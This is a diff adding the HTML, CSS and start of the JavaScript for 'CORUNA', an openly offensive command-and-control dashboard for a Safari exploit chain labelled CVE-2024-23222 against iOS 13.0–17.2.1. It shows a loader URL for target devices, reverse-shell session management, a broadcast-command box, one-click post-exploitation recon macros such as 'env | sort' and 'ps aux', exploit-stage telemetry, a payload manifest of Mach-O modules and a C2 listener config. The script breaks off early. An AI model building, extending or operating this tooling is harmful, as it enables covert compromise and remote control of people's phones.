@@ -1,0 +1,1750 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <title>CORUNA // C2 &amp; Exploit Command Center</title>
+    <style>
+        :root {
+            --bg-void: #06080e;
+            --bg-panel: rgba(13, 18, 30, 0.86);
+            --bg-panel-elevated: rgba(20, 28, 46, 0.92);
+            --bg-terminal: #04060b;
+            --border-subtle: rgba(56, 189, 248, 0.14);
+            --border-glow: rgba(56, 189, 248, 0.42);
+            --text-primary: #e2e8f0;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --accent-cyan: #38bdf8;
+            --accent-indigo: #818cf8;
+            --accent-emerald: #10b981;
+            --accent-amber: #f59e0b;
+            --accent-rose: #f43f5e;
+            --font-sans: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
+            --font-mono: "SF Mono", ui-monospace, Menlo, Monaco, Consolas, monospace;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        html, body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background-color: var(--bg-void);
+            background-image:
+                radial-gradient(circle at 12% 8%, rgba(56, 189, 248, 0.10), transparent 38%),
+                radial-gradient(circle at 88% 85%, rgba(129, 140, 248, 0.08), transparent 40%),
+                linear-gradient(rgba(56, 189, 248, 0.025) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(56, 189, 248, 0.025) 1px, transparent 1px);
+            background-size: 100% 100%, 100% 100%, 28px 28px, 28px 28px;
+            color: var(--text-primary);
+            font-family: var(--font-sans);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .app-shell {
+            max-width: 1480px;
+            margin: 0 auto;
+            padding: 16px 20px 32px;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            min-height: 100vh;
+        }
+
+        /* Header HUD */
+        .hud-header {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            gap: 14px;
+            padding: 14px 20px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border-subtle);
+            border-radius: 14px;
+            box-shadow: 0 12px 36px -8px rgba(0, 0, 0, 0.65), inset 0 1px 0 rgba(255, 255, 255, 0.06);
+            backdrop-filter: blur(14px);
+        }
+
+        .brand-group {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .brand-emblem {
+            width: 42px;
+            height: 42px;
+            border-radius: 11px;
+            background: linear-gradient(135deg, rgba(56, 189, 248, 0.22), rgba(129, 140, 248, 0.16));
+            border: 1px solid var(--border-glow);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 20px rgba(56, 189, 248, 0.22);
+            flex-shrink: 0;
+        }
+
+        .brand-emblem svg {
+            width: 22px;
+            height: 22px;
+            stroke: var(--accent-cyan);
+        }
+
+        .brand-title-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .brand-title-row h1 {
+            margin: 0;
+            font-size: 1.15rem;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            background: linear-gradient(90deg, #ffffff, #7dd3fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .tag-badge {
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            font-weight: 600;
+            padding: 3px 8px;
+            border-radius: 6px;
+            background: rgba(56, 189, 248, 0.12);
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            color: var(--accent-cyan);
+            letter-spacing: 0.04em;
+        }
+
+        .brand-sub {
+            margin: 3px 0 0;
+            font-size: 0.78rem;
+            color: var(--text-secondary);
+        }
+
+        .hud-controls {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .ws-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 7px;
+            padding: 6px 12px;
+            border-radius: 999px;
+            font-family: var(--font-mono);
+            font-size: 0.72rem;
+            font-weight: 600;
+            background: rgba(16, 185, 129, 0.12);
+            border: 1px solid rgba(16, 185, 129, 0.35);
+            color: #34d399;
+        }
+
+        .ws-pill.offline {
+            background: rgba(245, 158, 11, 0.12);
+            border-color: rgba(245, 158, 11, 0.35);
+            color: #fbbf24;
+        }
+
+        .pulse-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: currentColor;
+            box-shadow: 0 0 8px currentColor;
+            animation: pulseAnim 2s infinite;
+        }
+
+        @keyframes pulseAnim {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.45; transform: scale(0.9); }
+        }
+
+        /* Metric Strip */
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+        }
+
+        .metric-card {
+            background: var(--bg-panel);
+            border: 1px solid var(--border-subtle);
+            border-radius: 12px;
+            padding: 12px 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .metric-label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: var(--text-muted);
+            font-weight: 600;
+        }
+
+        .metric-value {
+            font-family: var(--font-mono);
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            display: flex;
+            align-items: baseline;
+            justify-content: space-between;
+            gap: 8px;
+        }
+
+        .metric-sub {
+            font-family: var(--font-mono);
+            font-size: 0.73rem;
+            color: var(--text-secondary);
+        }
+
+        /* Navigation & Target URL Bar */
+        .nav-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border-subtle);
+            border-radius: 12px;
+            padding: 8px 12px;
+        }
+
+        .tabs-group {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            background: transparent;
+            border: 1px solid transparent;
+            color: var(--text-secondary);
+            font-family: var(--font-sans);
+            font-size: 0.83rem;
+            font-weight: 600;
+            padding: 8px 14px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.15s ease;
+        }
+
+        .tab-btn:hover {
+            color: var(--text-primary);
+            background: rgba(56, 189, 248, 0.07);
+        }
+
+        .tab-btn.active {
+            background: rgba(56, 189, 248, 0.15);
+            border-color: rgba(56, 189, 248, 0.38);
+            color: var(--accent-cyan);
+            box-shadow: 0 0 16px rgba(56, 189, 248, 0.12);
+        }
+
+        .tab-count {
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            padding: 1px 6px;
+            border-radius: 99px;
+            background: rgba(255, 255, 255, 0.08);
+            color: var(--text-primary);
+        }
+
+        .target-url-box {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(4, 6, 11, 0.75);
+            border: 1px solid rgba(56, 189, 248, 0.2);
+            border-radius: 8px;
+            padding: 5px 10px;
+            font-family: var(--font-mono);
+            font-size: 0.76rem;
+            color: #7dd3fc;
+        }
+
+        /* Buttons */
+        .btn {
+            background: rgba(30, 41, 59, 0.8);
+            border: 1px solid rgba(148, 163, 184, 0.25);
+            color: var(--text-primary);
+            font-family: var(--font-sans);
+            font-size: 0.78rem;
+            font-weight: 600;
+            padding: 7px 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.15s ease;
+            text-decoration: none;
+        }
+
+        .btn:hover {
+            border-color: var(--accent-cyan);
+            background: rgba(56, 189, 248, 0.14);
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, rgba(56, 189, 248, 0.22), rgba(129, 140, 248, 0.22));
+            border-color: rgba(56, 189, 248, 0.45);
+            color: #bae6fd;
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, rgba(56, 189, 248, 0.32), rgba(129, 140, 248, 0.32));
+            box-shadow: 0 0 15px rgba(56, 189, 248, 0.25);
+        }
+
+        .btn-emerald {
+            background: rgba(16, 185, 129, 0.15);
+            border-color: rgba(16, 185, 129, 0.4);
+            color: #6ee7b7;
+        }
+
+        .btn-emerald:hover {
+            background: rgba(16, 185, 129, 0.25);
+            border-color: #10b981;
+        }
+
+        .btn-danger {
+            background: rgba(244, 63, 94, 0.14);
+            border-color: rgba(244, 63, 94, 0.38);
+            color: #fda4af;
+        }
+
+        .btn-danger:hover {
+            background: rgba(244, 63, 94, 0.26);
+            border-color: #f43f5e;
+        }
+
+        .btn-sm {
+            padding: 4px 9px;
+            font-size: 0.72rem;
+            border-radius: 6px;
+        }
+
+        /* Tab Views */
+        .tab-panel {
+            display: none;
+            flex: 1;
+        }
+
+        .tab-panel.active {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        /* Command Center Split Layout */
+        .command-layout {
+            display: grid;
+            grid-template-columns: 340px 1fr;
+            gap: 14px;
+            min-height: 620px;
+        }
+
+        @media (max-width: 980px) {
+            .command-layout {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .panel-card {
+            background: var(--bg-panel);
+            border: 1px solid var(--border-subtle);
+            border-radius: 14px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .panel-header {
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border-subtle);
+            background: rgba(15, 23, 42, 0.6);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .panel-title {
+            font-size: 0.82rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.07em;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* Sessions Sidebar */
+        .sessions-list {
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            overflow-y: auto;
+            max-height: 430px;
+        }
+
+        .session-item {
+            padding: 11px 12px;
+            border-radius: 10px;
+            background: rgba(15, 23, 42, 0.65);
+            border: 1px solid rgba(148, 163, 184, 0.14);
+            cursor: pointer;
+            transition: all 0.15s ease;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .session-item:hover {
+            border-color: rgba(56, 189, 248, 0.4);
+            background: rgba(20, 30, 52, 0.85);
+        }
+
+        .session-item.selected {
+            border-color: var(--accent-cyan);
+            background: rgba(56, 189, 248, 0.11);
+            box-shadow: inset 0 0 18px rgba(56, 189, 248, 0.08);
+        }
+
+        .session-item.closed-item {
+            opacity: 0.68;
+        }
+
+        .session-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 6px;
+        }
+
+        .session-id-badge {
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            font-weight: 700;
+            color: var(--accent-cyan);
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--accent-emerald);
+            box-shadow: 0 0 8px var(--accent-emerald);
+        }
+
+        .status-dot.closed {
+            background: var(--text-muted);
+            box-shadow: none;
+        }
+
+        .session-host {
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        .session-meta {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-family: var(--font-mono);
+            font-size: 0.69rem;
+            color: var(--text-muted);
+        }
+
+        .empty-state {
+            padding: 28px 16px;
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.82rem;
+            line-height: 1.5;
+        }
+
+        .broadcast-box {
+            padding: 10px 12px;
+            border-top: 1px solid var(--border-subtle);
+            background: rgba(10, 14, 24, 0.75);
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-top: auto;
+        }
+
+        .broadcast-row {
+            display: flex;
+            gap: 6px;
+        }
+
+        .input-field {
+            background: rgba(4, 6, 11, 0.9);
+            border: 1px solid rgba(148, 163, 184, 0.25);
+            color: var(--text-primary);
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            padding: 7px 10px;
+            border-radius: 8px;
+            outline: none;
+            width: 100%;
+        }
+
+        .input-field:focus {
+            border-color: var(--accent-cyan);
+            box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.16);
+        }
+
+        /* Interactive Terminal Panel */
+        .quick-macros {
+            padding: 8px 14px;
+            border-bottom: 1px solid var(--border-subtle);
+            background: rgba(10, 15, 28, 0.75);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .macro-label {
+            font-size: 0.68rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            color: var(--text-muted);
+            margin-right: 4px;
+        }
+
+        .macro-chip {
+            background: rgba(30, 41, 59, 0.65);
+            border: 1px solid rgba(56, 189, 248, 0.2);
+            color: #bae6fd;
+            font-family: var(--font-mono);
+            font-size: 0.71rem;
+            padding: 4px 9px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.12s ease;
+        }
+
+        .macro-chip:hover {
+            background: rgba(56, 189, 248, 0.2);
+            border-color: var(--accent-cyan);
+        }
+
+        .terminal-viewport {
+            flex: 1;
+            background: var(--bg-terminal);
+            padding: 14px 16px;
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            line-height: 1.52;
+            overflow-y: auto;
+            min-height: 410px;
+            max-height: 520px;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+
+        .term-entry {
+            margin-bottom: 2px;
+        }
+
+        .term-ts {
+            color: #475569;
+            font-size: 0.72rem;
+            margin-right: 8px;
+            user-select: none;
+        }
+
+        .hide-ts .term-ts {
+            display: none;
+        }
+
+        .term-input {
+            color: #38bdf8;
+            font-weight: 600;
+        }
+
+        .term-output {
+            color: #e2e8f0;
+        }
+
+        .term-system {
+            color: #fbbf24;
+            font-style: italic;
+        }
+
+        .terminal-prompt-bar {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 14px;
+            background: rgba(8, 12, 22, 0.95);
+            border-top: 1px solid var(--border-subtle);
+        }
+
+        .prompt-prefix {
+            font-family: var(--font-mono);
+            font-size: 0.84rem;
+            font-weight: 700;
+            color: var(--accent-emerald);
+            white-space: nowrap;
+        }
+
+        .terminal-cmd-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #f8fafc;
+            font-family: var(--font-mono);
+            font-size: 0.86rem;
+            outline: none;
+        }
+
+        /* Telemetry Table */
+        .telemetry-toolbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            flex-wrap: wrap;
+            padding: 10px 16px;
+            border-bottom: 1px solid var(--border-subtle);
+        }
+
+        .filter-pills {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .log-table-wrap {
+            overflow-x: auto;
+            max-height: 580px;
+            overflow-y: auto;
+        }
+
+        table.data-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.8rem;
+        }
+
+        table.data-table th {
+            text-align: left;
+            padding: 10px 14px;
+            background: rgba(15, 23, 42, 0.85);
+            color: var(--text-muted);
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 0.07em;
+            position: sticky;
+            top: 0;
+            border-bottom: 1px solid var(--border-subtle);
+        }
+
+        table.data-table td {
+            padding: 9px 14px;
+            border-bottom: 1px solid rgba(148, 163, 184, 0.08);
+            font-family: var(--font-mono);
+            font-size: 0.77rem;
+        }
+
+        table.data-table tr:hover td {
+            background: rgba(56, 189, 248, 0.04);
+        }
+
+        .stage-pill {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 0.7rem;
+            font-weight: 600;
+        }
+
+        .cat-exploit {
+            background: rgba(56, 189, 248, 0.15);
+            color: #38bdf8;
+            border: 1px solid rgba(56, 189, 248, 0.3);
+        }
+
+        .cat-payload {
+            background: rgba(244, 63, 94, 0.15);
+            color: #fda4af;
+            border: 1px solid rgba(244, 63, 94, 0.35);
+        }
+
+        .cat-c2 {
+            background: rgba(16, 185, 129, 0.16);
+            color: #34d399;
+            border: 1px solid rgba(16, 185, 129, 0.35);
+        }
+
+        .cat-ui, .cat-http {
+            background: rgba(148, 163, 184, 0.12);
+            color: #94a3b8;
+            border: 1px solid rgba(148, 163, 184, 0.25);
+        }
+
+        /* Arsenal Grid */
+        .stages-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
+            gap: 12px;
+            padding: 14px;
+        }
+
+        .stage-card {
+            background: rgba(15, 23, 42, 0.65);
+            border: 1px solid rgba(56, 189, 248, 0.16);
+            border-radius: 10px;
+            padding: 13px 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .stage-card-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 8px;
+        }
+
+        .stage-filename {
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            font-weight: 700;
+            color: #f8fafc;
+            word-break: break-all;
+        }
+
+        /* Config Form */
+        .config-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 16px;
+            padding: 18px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .form-group label {
+            font-size: 0.76rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            font-family: var(--font-mono);
+        }
+
+        /* Modal for Source Inspection */
+        .modal-backdrop {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(3, 5, 10, 0.82);
+            backdrop-filter: blur(6px);
+            z-index: 100;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+
+        .modal-backdrop.open {
+            display: flex;
+        }
+
+        .modal-box {
+            background: var(--bg-panel-elevated);
+            border: 1px solid var(--border-glow);
+            border-radius: 14px;
+            width: 100%;
+            max-width: 1020px;
+            max-height: 86vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 24px 64px rgba(0, 0, 0, 0.85);
+        }
+
+        .modal-code {
+            margin: 0;
+            padding: 16px;
+            background: #04060b;
+            color: #e2e8f0;
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            line-height: 1.5;
+            overflow: auto;
+            flex: 1;
+        }
+
+        .toast-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            z-index: 200;
+        }
+
+        .toast {
+            background: rgba(15, 23, 42, 0.95);
+            border: 1px solid var(--accent-cyan);
+            color: var(--text-primary);
+            padding: 10px 14px;
+            border-radius: 10px;
+            font-size: 0.8rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+        }
+    </style>
+</head>
+<body>
+    <div class="app-shell">
+        <!-- Top HUD Header -->
+        <header class="hud-header">
+            <div class="brand-group">
+                <div class="brand-emblem">
+                    <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polygon points="12 2 2 7 12 12 22 7 12 2"></polygon>
+                        <polyline points="2 17 12 22 22 17"></polyline>
+                        <polyline points="2 12 12 17 22 12"></polyline>
+                    </svg>
+                </div>
+                <div>
+                    <div class="brand-title-row">
+                        <h1>CORUNA // COMMAND CENTER</h1>
+                        <span class="tag-badge">CVE-2024-23222</span>
+                        <span class="tag-badge" style="color:#a5b4fc; border-color:rgba(129,140,248,0.35); background:rgba(129,140,248,0.12);">iOS 13.0 – 17.2.1</span>
+                    </div>
+                    <p class="brand-sub">Interactive Exploit Delivery &amp; C2 Reverse Shell Orchestrator</p>
+                </div>
+            </div>
+
+            <div class="hud-controls">
+                <button class="btn btn-emerald" id="btnSpawnTest" title="Connect a local loopback shell session to test C2 commands immediately">
+                    + Spawn Test Session
+                </button>
+                <a class="btn" href="/coruna/group.html" target="_blank" rel="noopener">
+                    Open Loader Page ↗
+                </a>
+                <div class="ws-pill" id="wsStatusPill">
+                    <span class="pulse-dot"></span>
+                    <span id="wsStatusText">LIVE TELEMETRY</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- Metrics Strip -->
+        <section class="metrics-grid">
+            <div class="metric-card">
+                <span class="metric-label">Active C2 Sessions</span>
+                <div class="metric-value">
+                    <span id="metricActiveSessions" style="color: var(--accent-emerald);">0</span>
+                    <span class="metric-sub" id="metricTotalSessions">0 total connected</span>
+                </div>
+            </div>
+            <div class="metric-card">
+                <span class="metric-label">C2 TCP Listener</span>
+                <div class="metric-value">
+                    <span id="metricC2Endpoint" style="color: var(--accent-cyan);">0.0.0.0:8080</span>
+                    <span class="metric-sub">Raw Async TCP</span>
+                </div>
+            </div>
+            <div class="metric-card">
+                <span class="metric-label">Exploit Stage Hits</span>
+                <div class="metric-value">
+                    <span id="metricExploitHits" style="color: var(--accent-indigo);">0</span>
+                    <span class="metric-sub" id="metricHttpTotal">0 HTTP requests</span>
+                </div>
+            </div>
+            <div class="metric-card">
+                <span class="metric-label">Orchestrator Uptime</span>
+                <div class="metric-value">
+                    <span id="metricUptime">00:00:00</span>
+                    <span class="metric-sub" id="metricWebBind">HTTP :80</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- Navigation & Target Delivery URL -->
+        <nav class="nav-bar">
+            <div class="tabs-group">
+                <button class="tab-btn active" data-tab="command">
+                    <span>Command Center</span>
+                    <span class="tab-count" id="tabBadgeSessions">0</span>
+                </button>
+                <button class="tab-btn" data-tab="telemetry">
+                    <span>Live Telemetry</span>
+                    <span class="tab-count" id="tabBadgeLogs">0</span>
+                </button>
+                <button class="tab-btn" data-tab="arsenal">
+                    <span>Stage Arsenal &amp; Payloads</span>
+                </button>
+                <button class="tab-btn" data-tab="config">
+                    <span>Server Config</span>
+                </button>
+            </div>
+
+            <div class="target-url-box">
+                <span style="color: var(--text-muted);">Target Safari URL:</span>
+                <code id="targetSafariUrl">http://127.0.0.1/coruna/group.html</code>
+                <button class="btn btn-sm" id="btnCopyTargetUrl">Copy</button>
+            </div>
+        </nav>
+
+        <!-- TAB 1: COMMAND CENTER (SESSIONS + INTERACTIVE SHELL) -->
+        <div class="tab-panel active" id="tab-command">
+            <div class="command-layout">
+                <!-- Left Sidebar: Active & Historical Sessions -->
+                <aside class="panel-card">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <span>C2 Sessions</span>
+                        </div>
+                        <button class="btn btn-sm" id="btnRefreshSessions">Refresh</button>
+                    </div>
+
+                    <div class="sessions-list" id="sessionsListContainer">
+                        <div class="empty-state">
+                            No active C2 sessions.<br />
+                            Open the loader URL on a target device or click <strong>+ Spawn Test Session</strong> above.
+                        </div>
+                    </div>
+
+                    <!-- Broadcast Command Box -->
+                    <div class="broadcast-box">
+                        <span class="metric-label">Broadcast to All Active Sessions</span>
+                        <form class="broadcast-row" id="broadcastForm">
+                            <input type="text" class="input-field" id="broadcastInput" placeholder="e.g. uname -a" autocomplete="off" />
+                            <button type="submit" class="btn btn-primary btn-sm">Send All</button>
+                        </form>
+                    </div>
+                </aside>
+
+                <!-- Right Main: Interactive Shell -->
+                <section class="panel-card">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <span id="termHeaderTitle">Interactive Shell // No Session Selected</span>
+                            <span class="tag-badge" id="termHeaderBadge" style="display:none;">ACTIVE</span>
+                        </div>
+                        <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                            <button class="btn btn-sm" id="btnToggleTimestamps">Timestamps: ON</button>
+                            <button class="btn btn-sm" id="btnClearTerminal">Clear View</button>
+                            <button class="btn btn-sm" id="btnDownloadTranscript">Download .log</button>
+                            <button class="btn btn-danger btn-sm" id="btnDisconnectSession" style="display:none;">Disconnect</button>
+                        </div>
+                    </div>
+
+                    <!-- Quick Post-Exploitation Recon Macros -->
+                    <div class="quick-macros">
+                        <span class="macro-label">Quick Recon:</span>
+                        <button class="macro-chip" data-cmd="uname -a && sw_vers 2>/dev/null || true">System Info</button>
+                        <button class="macro-chip" data-cmd="id && whoami">Identity</button>
+                        <button class="macro-chip" data-cmd="pwd && ls -la">Directory</button>
+                        <button class="macro-chip" data-cmd="ps aux | head -n 35">Processes</button>
+                        <button class="macro-chip" data-cmd="ifconfig 2>/dev/null || ip addr">Network</button>
+                        <button class="macro-chip" data-cmd="df -h">Disk &amp; Mounts</button>
+                        <button class="macro-chip" data-cmd="sysctl -a 2>/dev/null | grep -E 'hw.machine|hw.model|kern.osversion|kern.version' | head -n 20">Hardware / Kernel</button>
+                        <button class="macro-chip" data-cmd="env | sort">Environment</button>
+                    </div>
+
+                    <!-- Terminal Output -->
+                    <div class="terminal-viewport" id="terminalViewport">
+                        <div class="term-system">[*] Select an active C2 session on the left (or click "+ Spawn Test Session") to begin interactive command execution.</div>
+                    </div>
+
+                    <!-- Command Input Bar -->
+                    <form class="terminal-prompt-bar" id="terminalForm">
+                        <span class="prompt-prefix" id="terminalPromptPrefix">(no-session)$</span>
+                        <input
+                            type="text"
+                            class="terminal-cmd-input"
+                            id="terminalCmdInput"
+                            placeholder="Type a shell command and press Enter (Up/Down for history)..."
+                            autocomplete="off"
+                            spellcheck="false"
+                            disabled
+                        />
+                        <button type="submit" class="btn btn-primary btn-sm" id="terminalSendBtn" disabled>Execute</button>
+                    </form>
+                </section>
+            </div>
+        </div>
+
+        <!-- TAB 2: LIVE TELEMETRY & HTTP EXPLOIT DELIVERY LOGS -->
+        <div class="tab-panel" id="tab-telemetry">
+            <div class="panel-card">
+                <div class="telemetry-toolbar">
+                    <div class="filter-pills" id="logCategoryFilters">
+                        <button class="btn btn-sm btn-primary" data-filter="all">All Events</button>
+                        <button class="btn btn-sm" data-filter="exploit">Exploit Stages</button>
+                        <button class="btn btn-sm" data-filter="payload">Payloads &amp; Dylib</button>
+                        <button class="btn btn-sm" data-filter="c2">C2 Socket Events</button>
+                        <button class="btn btn-sm" data-filter="ui">UI &amp; Static</button>
+                    </div>
+                    <div style="display:flex; gap:8px; align-items:center;">
+                        <input type="text" class="input-field" id="logSearchInput" placeholder="Filter by IP, path, stage..." style="width:230px;" />
+                        <button class="btn btn-danger btn-sm" id="btnClearLogs">Clear Logs</button>
+                    </div>
+                </div>
+
+                <div class="log-table-wrap">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Time</th>
+                                <th>Category / Stage</th>
+                                <th>Source IP</th>
+                                <th>Method</th>
+                                <th>Request Path / Event</th>
+                                <th>Status</th>
+                                <th>Latency</th>
+                            </tr>
+                        </thead>
+                        <tbody id="telemetryTableBody">
+                            <tr>
+                                <td colspan="7" class="empty-state">Waiting for HTTP exploit requests or C2 connections...</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 3: STAGE ARSENAL & PAYLOAD MANIFEST -->
+        <div class="tab-panel" id="tab-arsenal">
+            <div class="panel-card">
+                <div class="panel-header">
+                    <div class="panel-title">Coruna Exploit Modules &amp; Stages</div>
+                    <span class="metric-sub" id="arsenalSummaryText">Loading stage modules...</span>
+                </div>
+                <div class="stages-grid" id="stagesGridContainer"></div>
+            </div>
+
+            <div class="panel-card">
+                <div class="panel-header">
+                    <div class="panel-title">Payload Manifest Targets (manifest.json)</div>
+                    <button class="btn btn-sm" id="btnInspectManifest">Inspect Raw manifest.json</button>
+                </div>
+                <div class="log-table-wrap">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Target Build / Hash Key</th>
+                                <th>Stage Entries</th>
+                                <th>Total Bundle Size</th>
+                                <th>Mach-O &amp; Binary Modules</th>
+                            </tr>
+                        </thead>
+                        <tbody id="manifestTableBody"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 4: SERVER CONFIGURATION -->
+        <div class="tab-panel" id="tab-config">
+            <div class="panel-card">
+                <div class="panel-header">
+                    <div class="panel-title">Server Runtime &amp; Persistent Configuration (config.json)</div>
+                    <button class="btn btn-primary btn-sm" id="btnSaveConfig">Save config.json</button>
+                </div>
+                <form class="config-grid" id="configForm">
+                    <div class="form-group">
+                        <label for="cfg_web_server_ip">web_server_ip</label>
+                        <input type="text" class="input-field" id="cfg_web_server_ip" />
+                    </div>
+                    <div class="form-group">
+                        <label for="cfg_web_server_port">web_server_port</label>
+                        <input type="number" class="input-field" id="cfg_web_server_port" />
+                    </div>
+                    <div class="form-group">
+                        <label for="cfg_c2_bind">c2_bind</label>
+                        <input type="text" class="input-field" id="cfg_c2_bind" />
+                    </div>
+                    <div class="form-group">
+                        <label for="cfg_c2_port">c2_port</label>
+                        <input type="number" class="input-field" id="cfg_c2_port" />
+                    </div>
+                    <div class="form-group">
+                        <label for="cfg_exploit_templates_dir">exploit_templates_dir</label>
+                        <input type="text" class="input-field" id="cfg_exploit_templates_dir" />
+                    </div>
+                    <div class="form-group">
+                        <label for="cfg_static_files_dir">static_files_dir</label>
+                        <input type="text" class="input-field" id="cfg_static_files_dir" />
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Source Viewer Modal -->
+    <div class="modal-backdrop" id="sourceModal">
+        <div class="modal-box">
+            <div class="panel-header">
+                <div class="panel-title" id="sourceModalTitle">Source Inspector</div>
+                <button class="btn btn-sm" id="btnCloseModal">Close (Esc)</button>
+            </div>
+            <pre class="modal-code" id="sourceModalCode"></pre>
+        </div>
+    </div>
+
+    <div class="toast-container" id="toastContainer"></div>
+
+    <script>
+        (() => {
+            const state = {
+                ws: null,
+                uptimeSeconds: 0,
+                sessions: { active: [], closed: [], total_count: 0 },
+                selectedSessionId: null,
+                transcripts: {}, // sessionId -> array of entries
+                logs: [],
+                logFilter: "all",
+                logSearch: "",
+                showTimestamps: true,
+                cmdHistory: [],
